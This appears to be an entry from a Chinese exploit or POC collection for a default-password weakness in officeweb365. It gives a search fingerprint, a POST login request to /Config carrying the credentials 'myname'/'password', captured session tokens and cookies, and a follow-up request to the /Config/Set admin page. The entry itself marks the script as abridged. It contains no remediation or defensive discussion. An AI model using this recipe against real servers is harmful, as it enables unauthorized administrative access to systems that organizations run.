# officeweb365弱口令漏洞

- **系统**：officeweb365　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`header="officeweb365"`
- **请求**：`POST /Config HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: __RequestVerificationToken=6M9PqmXVulFhDKt2P1SklEQObOkBIB9BeVF0BsaVpwbiK5_3L-2O1…`

**请求体 / payload**
```
uName=myname&uPass=password&__RequestVerificationToken=Qp4hkk1P8vDTiGV-zdCUPue6SufNtvcxoOvhVmhgRdpyXKUcUjdXg434yclFhX1if2o9nara0jXhsv1LlWEW_He5wCrBjP3SO0le7nc7g6g1
取cookie带入到后续请求
GET /Config/Set HTTP/1.1
Host:
Cookie: __RequestVerificationToken=6M9PqmXVulFhDKt2P1SklEQObOkBIB9BeVF0BsaVpwbiK5_3L-2O1rJ65pJQIWtSGNhw94oOjKj38APSqkXKfgfpKMXws4ZnHj6mYCut8aQ1; OfficeWeb3653=18166CFD51F5092D455329256B75DE05737C8CACFB3C930782CD0F3934798B75776FE2AE5D2AB0B992B9979594B28F2BDF38E34EA6E79687D3071D22E86483E1E88D5CD97B2A9E7A55E67350D087E6C14F892DD9AD464454B4D063AF20625223D561A55EB70A8D6408D7680ACA7AED7215D1A0E…（脚本共 710 字，完整版见原文）
```
- **预期**：200　|　—